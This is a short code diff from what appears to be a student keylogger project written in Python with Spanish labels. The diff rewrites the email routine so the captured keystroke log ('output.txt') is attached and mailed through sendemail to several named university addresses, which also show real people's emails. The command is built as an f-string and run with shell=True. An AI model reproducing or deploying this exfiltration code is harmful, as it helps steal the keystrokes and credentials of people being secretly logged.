@@ -10,9 +10,8 @@ def output(text):
     with open('output.txt', 'a') as f:
         f.write(text)
 
-def send_email(sender_email, receiver_email, mensaje):
-    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'output.txt'"
-
+def send_email(sender_email, receiver_email):
+    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'Se adjunta el archivo de registros' -a output.txt"
     subprocess.run(command, shell=True)
 
 
@@ -47,8 +46,11 @@ def main():
         sender_email = "PaoPatrol_PJAB@hotmail.com"
         receiver_email = "Paola_VB@ciencias.unam.mx"
         
-        send_email(sender_email, receiver_email, registro)
-        
+        send_email(sender_email, receiver_email)
+        send_email(sender_email, "britny_brito@ciencias.unam.mx")
+        send_email(sender_email, "natanael_pi@ciencias.unam.mx")
+        send_email(sender_email, "janet1204@ciencias.unam.mx")
+
     if respuesta_guardar.lower() in ['yes', 'y']:
         remove('output.txt')
 
